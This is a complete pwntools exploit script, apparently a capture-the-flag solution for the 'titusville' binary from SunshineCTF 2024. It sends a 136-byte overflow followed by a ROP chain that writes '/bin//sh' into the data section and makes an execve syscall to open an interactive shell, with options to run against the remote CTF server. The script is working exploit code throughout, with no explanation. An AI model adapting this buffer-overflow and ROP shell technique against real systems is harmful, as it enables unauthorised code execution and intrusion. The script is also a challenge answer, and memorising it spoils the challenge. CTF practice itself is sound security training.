from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"


binary_name = "titusville"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)

REMOTE = "nc 2024.sunshinectf.games 24607 "

context.binary = e



def main():
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    else:
        if(sys.argv[1] == "remote"):
             p = remote("2024.sunshinectf.games", 24607)
        elif(sys.argv[1] == "gdb"):
            p = gdb.debug(f"./{binary_name}", gdbscript="b *0x401813", aslr=False)
        else:
            p = process(f"./{binary_name}")

    payload = 136 *b"A"
    data_section_addr = 0x00000000004c50e0

    # write /bin/sh to the data section
    payload += p64(0x0000000000409f6e) # pop rsi ;  
    payload += p64(data_section_addr) 
    payload += p64(0x0000000000448127) # pop rax ;  
    payload += b'/bin//sh'
    payload += p64(0x000000000044a5a5) # mov qword ptr [rsi], rax ;  

    payload += p64(0x0000000000409f6e) # pop rsi ;  
    payload += p64(data_section_addr+8) 
    payload += p64(0x000000000043d310) # xor rax, rax ;  
    payload += p64(0x000000000044a5a5) # mov qword ptr [rsi], rax ;  
    payload += p64(0x0000000000401eff) # pop rdi ;  
    payload += p64(data_section_addr)
    payload += p64(0x0000000000409f6e) # pop rsi ;  
    payload += p64(0x0) 
    payload += p64(0x000000000047f2ab) # pop rdx ; pop rbx ;  
    payload += p64(0x0) 
    payload += p64(0x0) 
    payload += p64(0x0000000000448127) # pop rax, 0x3b ;  
    payload+=p64(0x3b)
    payload += p64(0x0000000000401cb4) # syscall
    
    p.send(payload)
    p.interactive()

main()
